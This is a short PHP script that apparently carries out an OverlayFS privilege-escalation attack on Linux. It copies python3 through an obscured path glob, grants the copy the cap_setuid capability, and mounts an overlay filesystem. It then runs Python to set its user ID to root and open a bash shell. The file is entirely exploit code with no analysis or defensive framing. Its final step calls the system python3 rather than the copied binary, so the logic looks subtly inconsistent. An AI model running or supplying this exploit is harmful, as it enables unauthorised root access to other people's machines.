<?php
// Creation directory
mkdir('l');
mkdir('u');
mkdir('w');
mkdir('m');

// Copying files
$files = glob('/u*/b*/p*3');
foreach ($files as $file) {
    copy($file, 'l/' . basename($file));
}

// Setting privileges
exec('setcap cap_setuid+eip l/python3');

// Mounting the overlay file system
exec('mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m');

// Creating empty files
$filesInM = glob('m/*');
foreach ($filesInM as $fileInM) {
    touch($fileInM);
}

// Running a Python command
exec('python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'');
?>
